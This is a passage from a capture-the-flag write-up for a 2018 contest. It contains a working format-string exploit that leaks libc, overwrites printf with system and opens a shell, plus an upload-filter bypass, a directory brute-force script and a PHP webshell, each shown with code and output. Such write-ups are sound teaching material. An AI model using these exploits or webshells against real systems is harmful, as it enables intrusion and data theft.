Then I have to leak the libc version, but I am too lazy to do it so I try to find my local libc and check for the offset.
```
gets: 0x6ed80    (0x601028)
printf: 0x55800  (0x601020)?
usleep: 0xfdd60  (0x601030)
```
Now I understand why `0x601020` was unable to leak because of the null byte of its offset. I confirmed this by checking `0x601021` and I got this:
```
0x601021 0x7f3e9ac0d8 (end with '8', so the offset should be '800')
```
Finally, overwrite `printf` to `system` then we get the shell.

#### Exploit
```python
#!/usr/bin/env python

from pwn import *

host = '47.75.182.113'
port = 9999

r = remote(host, port)

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = '%' + str(result) + 'c'
    elif prev == word:
        result = 0
    else:
        result = 256 - prev + word
        fmtstr = '%' + str(result) + 'c'
    fmtstr += '%' + str(index) + '$hhn'
    return fmtstr

sleep(5)

system_off = 0x45390
printf_plt = 0x601020
gets_plt = 0x601028
gets_off = 0x6ed80

payload = '%7$s    ' + p64(gets_plt)
r.sendline(payload)
gets = u64(r.recv(1000, timeout=1)[:6].ljust(8, '\x00'))
print 'gets:', hex(gets)

libc = gets - gets_off
print 'libc:', hex(libc)

system = libc + system_off
print 'system:', hex(system)

payload = ''
prev = 0
for i in range(3):
    payload += fmt(prev, (system >> 8 * i) & 0xff, 11 + i)
    prev = (system >> 8 * i) & 0xff

payload += 'A'*(8 - (len(payload) % 8))
payload += p64(printf_plt) + p64(printf_plt+1) + p64(printf_plt+2)

r.sendline(payload)

r.recv(1000)
sleep(1)

r.sendline('/bin/sh')
r.sendline('cat flag')
flag = r.recvline()

log.success('FLAG: ' + flag)
```
```
[+] Opening connection to 47.75.182.113 on port 9999: Done
gets: 0x7f99aca0dd80
libc: 0x7f99ac99f000
system: 0x7f99ac9e4390
[+] FLAG: HITB{Baby_Pwn_BabY_bl1nd}
[*] Closed connection to 47.75.182.113 port 9999
```

## web

### Upload (bookgin)

#### Find the target
First, we can upload some images to the server. With some manual tests, we found we can upload `.PHP` to the server, since `.php` is WAFed. Addiotionally, we notice that the server OS is running Microsoft IIS, so the filesystem is case-insensitive. 

Next, we have to dig how to access our webshell. We have no idea the directory name of the uploaded files. 

Therefore, the objective is very clear: retrieve the path name of the directory.

It's Windows+PHP, so let's give this a try. Refer to [onsec whiltepaper - 02](http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf) page 5. I even write a post about this feature in [my blog](https://bookgin.github.io/2016/09/07/PHP-File-Access-in-Windows/) (in Chinese).

#### Brute force the path and RCE
Here is the brute script:

```python
#!/usr/bin/env python3
# Python 3.6.4
import requests
import string
sess = requests.session()

name = ''
while True:
    print(name)
    for i in string.digits + string.ascii_letters:
        guess = name + str(i)
        if 'image error' not in sess.get('http://47.90.97.18:9999/pic.php?filename=../' + guess + '%3C/1523462240.jpg').text:
            name += str(i)
            break
```

We have RCE now. Next, we found the flag is in `../flag.php`, but some php useful function is disabled. A quick bypass is `highlight_file`. Here is the web shell:
```php
<?php
error_reporting(E_ALL);

foreach (glob("../flag.php") as $filename) {
    echo "$filename size " . filesize($filename) . "\n";
    highlight_file($filename);
}
```


---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20180411-hitbxctfqual/README.md>*
